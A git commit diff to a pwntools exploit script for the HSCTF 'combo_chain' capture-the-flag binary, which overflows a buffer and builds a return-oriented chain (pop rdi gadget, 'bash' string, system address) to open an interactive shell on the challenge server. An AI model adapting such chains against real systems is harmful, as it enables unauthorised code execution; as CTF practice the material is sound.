73cd06d9c0cd679565eea5f032b3db5923876a64
root <root@localhost.localdomain>
2019-06-07 14:04:46 -0400

    7jun

--- hsctf/combo_chain_BINARY/scripts/apple.py
+++ hsctf/combo_chain_BINARY/scripts/apple.py
@@ -6,13 +6,16 @@ if SERVER:
 	host, port = 'pwn.hsctf.com', 2345
 	p = remote(host, port)
 else:
-	p = process('./combo-chain')
+	e = ELF('./combo-chain')
+	p = process(e.path)
 
 rdi_pop = 0x0401263
 bash = 0x402031
-system = 0x7ffff7f7590f
-
-
+system = 0x7ffff7e389c0
+plt_printf = 0x401050
+got_printf = 0x404028
+vuln = 0x401166
+main = 0x4011a4
 print p.recv()
 #bash = 0x402051
 #rdi_pop = 0x0000000000401273
@@ -20,7 +23,7 @@ print p.recv()
 padding = "A"*16
 payload = padding
 payload+= p64(rdi_pop)
-payload+= p64(system)
 payload+= p64(bash)
+payload+= p64(system)
 p.sendline(payload)
 p.interactive()
